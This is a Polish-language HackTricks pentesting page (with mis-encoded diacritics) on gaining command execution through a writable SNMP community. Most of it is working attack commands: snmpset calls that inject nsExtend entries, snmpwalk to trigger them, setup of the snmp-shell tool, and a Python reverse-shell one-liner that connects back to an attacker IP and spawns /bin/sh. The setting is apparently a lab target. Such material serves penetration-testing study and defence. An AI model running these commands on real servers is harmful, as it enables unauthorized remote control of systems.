<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

# SNMP RCE

SNMP moÅ¼e zostaÄ‡ wykorzystany przez atakujÄ…cego, jeÅ›li administrator przeoczy domyÅ›lnÄ… konfiguracjÄ™ na urzÄ…dzeniu lub serwerze. Poprzez **wykorzystanie spoÅ‚ecznoÅ›ci SNMP z uprawnieniami do zapisu (rwcommunity)** w systemie operacyjnym Linux, atakujÄ…cy moÅ¼e wykonywaÄ‡ polecenia na serwerze.

## Rozszerzanie usÅ‚ug za pomocÄ… dodatkowych poleceÅ„

Aby rozszerzyÄ‡ usÅ‚ugi SNMP i dodaÄ‡ dodatkowe polecenia, moÅ¼na doÅ‚Ä…czyÄ‡ nowe **wiersze do tabeli "nsExtendObjects"**. MoÅ¼na to osiÄ…gnÄ…Ä‡ za pomocÄ… polecenia `snmpset` i podajÄ…c niezbÄ™dne parametry, w tym bezwzglÄ™dnÄ… Å›cieÅ¼kÄ™ do pliku wykonywalnego i polecenie do wykonania:
```bash
snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c c0nfig localhost \
'nsExtendStatus."evilcommand"' = createAndGo \
'nsExtendCommand."evilcommand"' = /bin/echo \
'nsExtendArgs."evilcommand"' = 'hello world'
```
## Wstrzykiwanie poleceÅ„ do wykonania

Wstrzykiwanie poleceÅ„ do wykonania na usÅ‚udze SNMP wymaga istnienia i moÅ¼liwoÅ›ci wykonania wywoÅ‚ywanego pliku/skryptu. **`NET-SNMP-EXTEND-MIB`** wymaga podania bezwzglÄ™dnej Å›cieÅ¼ki do pliku wykonywalnego.

Aby potwierdziÄ‡ wykonanie wstrzykniÄ™tego polecenia, moÅ¼na uÅ¼yÄ‡ polecenia `snmpwalk`, aby wyliczyÄ‡ usÅ‚ugÄ™ SNMP. **WyjÅ›cie wyÅ›wietli polecenie i jego powiÄ…zane szczegÃ³Å‚y**, w tym bezwzglÄ™dnÄ… Å›cieÅ¼kÄ™:
```bash
snmpwalk -v2c -c SuP3RPrivCom90 10.129.2.26 NET-SNMP-EXTEND-MIB::nsExtendObjects
```
## Wykonywanie wstrzykniÄ™tych poleceÅ„

Gdy **wstrzykniÄ™te polecenie jest odczytywane, jest ono wykonywane**. Zachowanie to jest znane jako **`run-on-read()`**. Wykonanie polecenia moÅ¼na zaobserwowaÄ‡ podczas odczytu snmpwalk.

### Uzyskiwanie powÅ‚oki serwera za pomocÄ… SNMP

Aby uzyskaÄ‡ kontrolÄ™ nad serwerem i zdobyÄ‡ powÅ‚okÄ™ serwera, moÅ¼na skorzystaÄ‡ z skryptu pythona opracowanego przez mxrch, dostÄ™pnego pod adresem [**https://github.com/mxrch/snmp-shell.git**](https://github.com/mxrch/snmp-shell.git).

Alternatywnie, moÅ¼na rÄ™cznie utworzyÄ‡ odwrÃ³conÄ… powÅ‚okÄ™, wstrzykujÄ…c okreÅ›lone polecenie do SNMP. To polecenie, wywoÅ‚ane przez snmpwalk, ustanawia poÅ‚Ä…czenie odwrotne z maszynÄ… atakujÄ…cego, umoÅ¼liwiajÄ…c kontrolÄ™ nad maszynÄ… ofiary.
MoÅ¼esz zainstalowaÄ‡ wymagane oprogramowanie do uruchomienia tego:
```bash
sudo apt install snmp snmp-mibs-downloader rlwrap -y
git clone https://github.com/mxrch/snmp-shell
cd snmp-shell
sudo python3 -m pip install -r requirements.txt
```
Lub odwrÃ³cony shell:
```bash
snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c SuP3RPrivCom90 10.129.2.26 'nsExtendStatus."command10"' = createAndGo 'nsExtendCommand."command10"' = /usr/bin/python3.6 'nsExtendArgs."command10"' = '-c "import sys,socket,os,pty;s=socket.socket();s.connect((\"10.10.14.84\",8999));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")"'
```
## OdwoÅ‚ania
* [https://rioasmara.com/2021/02/05/snmp-arbitary-command-execution-and-shell/](https://rioasmara.com/2021/02/05/snmp-arbitary-command-execution-and-shell/)


<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ **reklamÄ™ swojej firmy w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriÃ³w github.

</details>
